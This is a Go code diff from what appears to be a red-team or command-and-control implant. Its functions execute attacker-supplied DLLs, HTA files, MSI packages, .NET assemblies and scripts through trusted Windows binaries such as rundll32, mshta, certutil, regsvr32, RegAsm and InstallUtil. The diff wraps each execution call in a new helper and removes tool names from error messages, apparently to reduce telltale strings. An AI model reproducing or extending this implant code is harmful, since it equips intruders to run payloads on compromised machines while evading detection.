@@ -28,7 +28,7 @@ func lolbinRundll32(dllPath, export, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, "rundll32.exe", cmdArgs)
+	cmd := safeCmdContext(ctx, "rundll32.exe", cmdArgs)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] rundll32.exe %s\n", cmdArgs)
@@ -54,7 +54,7 @@ func lolbinMsiexec(msiPath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, "msiexec.exe", cmdArgs...)
+	cmd := safeCmdContext(ctx, "msiexec.exe", cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] msiexec.exe %s\n", strings.Join(cmdArgs, " "))
@@ -79,13 +79,13 @@ func lolbinRegsvcs(dllPath, extraArgs string) structs.CommandResult {
 
 	regsvcsPath := findDotNetTool("RegSvcs.exe")
 	if regsvcsPath == "" {
-		return errorResult("Error: RegSvcs.exe not found in .NET Framework directories")
+		return errorResult("required binary not found in .NET Framework directories")
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, regsvcsPath, cmdArgs...)
+	cmd := safeCmdContext(ctx, regsvcsPath, cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] %s %s\n", regsvcsPath, strings.Join(cmdArgs, " "))
@@ -110,13 +110,13 @@ func lolbinRegasm(dllPath, extraArgs string) structs.CommandResult {
 
 	regasmPath := findDotNetTool("RegAsm.exe")
 	if regasmPath == "" {
-		return errorResult("Error: RegAsm.exe not found in .NET Framework directories")
+		return errorResult("required binary not found in .NET Framework directories")
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, regasmPath, cmdArgs...)
+	cmd := safeCmdContext(ctx, regasmPath, cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] %s %s\n", regasmPath, strings.Join(cmdArgs, " "))
@@ -142,7 +142,7 @@ func lolbinMshta(htaPath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, "mshta.exe", cmdArgs...)
+	cmd := safeCmdContext(ctx, "mshta.exe", cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] mshta.exe %s\n", strings.Join(cmdArgs, " "))
@@ -169,7 +169,7 @@ func lolbinCertutil(filePath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, "certutil.exe", cmdArgs...)
+	cmd := safeCmdContext(ctx, "certutil.exe", cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] certutil.exe %s\n", strings.Join(cmdArgs, " "))
@@ -208,7 +208,7 @@ func lolbinRegsvr32(payloadPath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, "regsvr32.exe", cmdArgs...)
+	cmd := safeCmdContext(ctx, "regsvr32.exe", cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] regsvr32.exe %s\n", strings.Join(cmdArgs, " "))
@@ -228,7 +228,7 @@ func lolbinRegsvr32(payloadPath, extraArgs string) structs.CommandResult {
 func lolbinInstallUtil(assemblyPath, extraArgs string) structs.CommandResult {
 	installUtilPath := findDotNetTool("InstallUtil.exe")
 	if installUtilPath == "" {
-		return errorResult("Error: InstallUtil.exe not found in .NET Framework directories")
+		return errorResult("required binary not found in .NET Framework directories")
 	}
 
 	cmdArgs := []string{"/logfile=", "/LogToConsole=false"}
@@ -240,7 +240,7 @@ func lolbinInstallUtil(assemblyPath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, installUtilPath, cmdArgs...)
+	cmd := safeCmdContext(ctx, installUtilPath, cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] %s %s\n", installUtilPath, strings.Join(cmdArgs, " "))
@@ -271,7 +271,7 @@ func lolbinVBS(scriptPath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
+	cmd := safeCmdContext(ctx, interpreter, cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] VBScript execution via %s\n    Script: %s\n", interpreter, scriptPath)
@@ -297,7 +297,7 @@ func lolbinLua(scriptPath, extraArgs string) structs.CommandResult {
 		}
 	}
 	if interpreter == "" {
-		return errorResult("Error: no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
+		return errorResult("no Lua interpreter found (lua, lua5.4, lua5.3, lua5.1, luajit)")
 	}
 
 	cmdArgs := []string{scriptPath}
@@ -308,7 +308,7 @@ func lolbinLua(scriptPath, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
+	cmd := safeCmdContext(ctx, interpreter, cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] Lua execution via %s\n    Script: %s\n", interpreter, scriptPath)
@@ -334,11 +334,11 @@ func lolbinPython(code, extraArgs string) structs.CommandResult {
 		}
 	}
 	if interpreter == "" {
-		return errorResult("Error: python3/python not found on this system")
+		return errorResult("python3/python not found on this system")
 	}
 
 	if code == "" && extraArgs == "" {
-		return errorResult("Error: provide code in 'path' field or script path in 'args' field")
+		return errorResult("provide code in 'path' field or script path in 'args' field")
 	}
 
 	var cmdArgs []string
@@ -354,7 +354,7 @@ func lolbinPython(code, extraArgs string) structs.CommandResult {
 	ctx, cancel := context.WithTimeout(context.Background(), lolbinTimeout)
 	defer cancel()
 
-	cmd := exec.CommandContext(ctx, interpreter, cmdArgs...)
+	cmd := safeCmdContext(ctx, interpreter, cmdArgs...)
 	output, err := cmd.CombinedOutput()
 
 	result := fmt.Sprintf("[+] Python execution via %s\n    %s %s\n", interpreter, interpreter, strings.Join(cmdArgs, " "))
